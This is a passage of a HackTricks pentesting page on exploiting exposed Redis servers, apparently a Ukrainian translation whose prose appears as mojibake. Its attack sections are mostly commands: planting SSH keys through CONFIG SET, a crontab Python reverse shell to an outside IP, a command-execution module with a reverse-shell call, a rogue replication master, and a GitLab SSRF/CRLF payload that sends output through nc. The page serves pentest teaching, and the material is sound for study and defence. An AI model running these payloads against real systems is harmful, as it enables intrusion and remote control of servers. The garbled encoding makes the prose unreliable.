–ë—É–¥—å –ª–∞—Å–∫–∞, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç **`config get dir`** –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏—Å—è –ø—ñ—Å–ª—è —ñ–Ω—à–∏—Ö —Ä—É—á–Ω–∏—Ö –µ–∫—Å–ø–ª–æ–π—Ç-–∫–æ–º–∞–Ω–¥. –†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ —Å–ø–æ—á–∞—Ç–∫—É –≤—ñ–¥—Ä–∞–∑—É –ø—ñ—Å–ª—è –≤—Ö–æ–¥—É –≤ Redis. –£ –≤–∏—Ö–æ–¥—ñ **`config get dir`** –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–¥–æ–º–∞—à–Ω—é** –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ redis** (–∑–∞–∑–≤–∏—á–∞–π _/var/lib/redis_ –∞–±–æ _/home/redis/.ssh_), —ñ –∑–Ω–∞—é—á–∏ —Ü–µ, –≤–∏ –∑–Ω–∞—î—Ç–µ, –∫—É–¥–∏ –º–æ–∂–Ω–∞ –∑–∞–ø–∏—Å–∞—Ç–∏ —Ñ–∞–π–ª `authenticated_users` –¥–ª—è –¥–æ—Å—Ç—É–ø—É —á–µ—Ä–µ–∑ ssh **–∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º redis**. –Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ –¥–æ–º–∞—à–Ω—é –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é —ñ–Ω—à–æ–≥–æ –¥—ñ–π—Å–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –¥–µ —É –≤–∞—Å —î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º:

1. –ó–≥–µ–Ω–µ—Ä—É–π—Ç–µ –ø–∞—Ä—É ssh –ø—É–±–ª—ñ—á–Ω–æ–≥–æ-–ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –Ω–∞ –≤–∞—à–æ–º—É –ü–ö: **`ssh-keygen -t rsa`**
2. –ó–∞–ø–∏—à—ñ—Ç—å –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á —É —Ñ–∞–π–ª : **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. –Ü–º–ø–æ—Ä—Ç—É–π—Ç–µ —Ñ–∞–π–ª —É redis : **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. –ó–±–µ—Ä–µ–∂—ñ—Ç—å –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á —É —Ñ–∞–π–ª—ñ **authorized\_keys** –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ redis:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. –ù–∞—Ä–µ—à—Ç—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ **ssh** –Ω–∞ **—Å–µ—Ä–≤–µ—Ä redis** –∑ –ø—Ä–∏–≤–∞—Ç–Ω–∏–º –∫–ª—é—á–µ–º : **ssh -i id\_rsa redis@10.85.0.52**

**–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∞ —Ç—É—Ç:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
–û—Å—Ç–∞–Ω–Ω—ñ–π –ø—Ä–∏–∫–ª–∞–¥ –¥–ª—è Ubuntu, –¥–ª—è **Centos** –≤–∏—â–µ –Ω–∞–≤–µ–¥–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

–¶–µ–π –º–µ—Ç–æ–¥ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∑–∞—Ä–æ–±—ñ—Ç–∫—É –±—ñ—Ç–∫–æ–π–Ω—ñ–≤ Ôºö[yam](https://www.v2ex.com/t/286981#reply14)

### –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–¥—É–ª—è Redis

1. –î–æ—Ç—Ä–∏–º—É—é—á–∏—Å—å —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ–π –∑ [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand), –≤–∏ –º–æ–∂–µ—Ç–µ **—Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –º–æ–¥—É–ª—å redis –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥**.
2. –ü–æ—Ç—ñ–º –≤–∞–º –ø–æ—Ç—Ä—ñ–±–µ–Ω —Å–ø–æ—Å—ñ–± **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π** –º–æ–¥—É–ª—å.
3. **–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π –º–æ–¥—É–ª—å** –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `MODULE LOAD /path/to/mymodule.so`.
4. **–ü–µ—Ä–µ—Ä–∞—Ö—É–π—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –º–æ–¥—É–ª—ñ**, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –±—É–≤ –≤—ñ–Ω –ø—Ä–∞–≤–∏–ª—å–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π: `MODULE LIST`.
5. **–í–∏–∫–æ–Ω–∞–π—Ç–µ** **–∫–æ–º–∞–Ω–¥–∏**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. –í–∏–≤–∞–Ω—Ç–∞–∂—Ç–µ –º–æ–¥—É–ª—å, –∫–æ–ª–∏ –∑–∞—Ö–æ—á–µ—Ç–µ: `MODULE UNLOAD mymodule`.

### –û–±—Ö—ñ–¥ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ LUA

[**–¢—É—Ç**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ Redis –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–æ–º–∞–Ω–¥—É **EVAL** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–∫–æ–¥—É Lua –≤ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ**. –£ –ø–æ–≤'—è–∑–∞–Ω–æ–º—É –ø–æ—Å—Ç—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, **—è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—é **dofile**, –∞–ª–µ [–æ—á–µ–≤–∏–¥–Ω–æ](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval), —â–æ —Ü–µ –±—ñ–ª—å—à–µ –Ω–µ –º–æ–∂–ª–∏–≤–æ. –£ –±—É–¥—å-—è–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–æ–±—ñ–π—Ç–∏ –ø—ñ—Å–æ—á–Ω–∏—Ü—é Lua**, –≤–∏ –º–æ–≥–ª–∏ –± **–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ** –∫–æ–º–∞–Ω–¥–∏ –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ. –¢–∞–∫–æ–∂, –∑ —Ç–æ–≥–æ –∂ –ø–æ—Å—Ç—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –¥–µ—è–∫—ñ **–≤–∞—Ä—ñ–∞–Ω—Ç–∏ –¥–ª—è –≤–∏–∫–ª–∏–∫—É DoS**.

–î–µ—è–∫—ñ **CVE –¥–ª—è –≤—Ç–µ—á—ñ –∑ LUA**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### –ú–æ–¥—É–ª—å Master-Slave

‚Äã–ì–æ–ª–æ–≤–Ω–∏–π redis –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—î –≤—Å—ñ –æ–ø–µ—Ä–∞—Ü—ñ—ó –∑ slave redis, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –º–∏ –º–æ–∂–µ–º–æ —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–π redis —è–∫ slave redis, –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –¥–æ –≥–æ–ª–æ–≤–Ω–æ–≥–æ redis, —è–∫–∏–π –º–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î–º–æ, —Ç–æ–¥—ñ –º–∏ –º–æ–∂–µ–º–æ –≤–≤–µ—Å—Ç–∏ –∫–æ–º–∞–Ω–¥—É –¥–æ –Ω–∞—à–æ–≥–æ –≤–ª–∞—Å–Ω–æ–≥–æ redis.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF talking to Redis

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ **—Ç–µ–∫—Å—Ç–æ–≤–∏–π** –∑–∞–ø–∏—Ç **–¥–æ Redis**, –≤–∏ –º–æ–∂–µ—Ç–µ **—Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –Ω–∏–º**, –æ—Å–∫—ñ–ª—å–∫–∏ Redis –±—É–¥–µ —á–∏—Ç–∞—Ç–∏ –∑–∞–ø–∏—Ç —Ä—è–¥–æ–∫ –∑–∞ —Ä—è–¥–∫–æ–º —ñ –ø—Ä–æ—Å—Ç–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –ø–æ–º–∏–ª–∫–∞–º–∏ –Ω–∞ —Ä—è–¥–∫–∏, —è–∫—ñ –Ω–µ —Ä–æ–∑—É–º—ñ—î:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
–¢–æ–º—É, —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **SSRF vuln** –Ω–∞ –≤–µ–±-—Å–∞–π—Ç—ñ —ñ –∑–º–æ–∂–µ—Ç–µ **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏** –¥–µ—è–∫—ñ **–∑–∞–≥–æ–ª–æ–≤–∫–∏** (–º–æ–∂–ª–∏–≤–æ, –∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é CRLF) –∞–±–æ **POST –ø–∞—Ä–∞–º–µ—Ç—Ä–∏**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ –¥–æ Redis.

### –ü—Ä–∏–∫–ª–∞–¥: Gitlab SSRF + CRLF –¥–æ Shell

–£ **Gitlab11.4.7** –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ **SSRF** –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ç–∞ **CRLF**. **SSRF** –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –±—É–ª–∞ –≤ **—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—ñ —ñ–º–ø–æ—Ä—Ç—É –ø—Ä–æ–µ–∫—Ç—É –∑ URL** –ø—ñ–¥ —á–∞—Å —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É —ñ –¥–æ–∑–≤–æ–ª—è–ª–∞ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–æ–≤—ñ–ª—å–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å —É —Ñ–æ—Ä–º—ñ \[0:0:0:0:0:ffff:127.0.0.1] (—Ü–µ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ 127.0.0.1), –∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å **CRLF** –±—É–ª–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –ø—Ä–æ—Å—Ç–æ **–¥–æ–¥–∞–≤–∞–Ω–Ω—è–º —Å–∏–º–≤–æ–ª—ñ–≤ %0D%0A** –¥–æ **URL**.

–¢–æ–º—É –±—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–æ–º Redis**, —è–∫–∏–π **–∫–µ—Ä—É—î —á–µ—Ä–≥–∞–º–∏** –∑ **gitlab** —ñ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º–∏ —á–µ—Ä–≥–∞–º–∏, —â–æ–± **–æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É**. –ü–µ–π–ª–æ–∞–¥ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —á–µ—Ä–≥–æ—é Redis:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
–Ü –∑–∞–ø–∏—Ç **URL encode**, —â–æ **–∑–ª–æ–≤–∂–∏–≤–∞—î SSRF** —Ç–∞ **CRLF** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `whoami` —ñ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –≤–∏—Ö–æ–¥—É —á–µ—Ä–µ–∑ `nc`, –≤–∏–≥–ª—è–¥–∞—î —Ç–∞–∫:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_–ó —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ (—è–∫ –¥–ª—è –∞–≤—Ç–æ—Ä–∞_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _–∑–≤—ñ–¥–∫–∏ –±—É–ª–∞ –≤–∑—è—Ç–∞ —Ü—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è) –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –ø—Ä–∞—Ü—é–≤–∞–ª–∞ –∑ —Å—Ö–µ–º–æ—é `git`, –∞ –Ω–µ –∑ —Å—Ö–µ–º–æ—é `http`._

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ —à—É–∫–∞—á–∞–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π!

**–Ü–Ω—Å–∞–π—Ç–∏ –∑ —Ö–∞–∫—ñ–Ω–≥—É**\
–ó–∞–ª—É—á–∞–π—Ç–µ—Å—è –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —è–∫–∏–π –∑–∞–Ω—É—Ä—é—î—Ç—å—Å—è –≤ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ —Ö–∞–∫—ñ–Ω–≥—É –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–°–ª—ñ–¥–∫—É–π—Ç–µ –∑–∞ —à–≤–∏–¥–∫–æ–ø–ª–∏–Ω–Ω–∏–º —Å–≤—ñ—Ç–æ–º —Ö–∞–∫—ñ–Ω–≥—É —á–µ—Ä–µ–∑ –Ω–æ–≤–∏–Ω–∏ —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–æ–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –≤–∏–Ω–∞–≥–æ—Ä–æ–¥ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —ñ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –ø—Ä–æ–≤—ñ–¥–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –ø–æ–¥–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
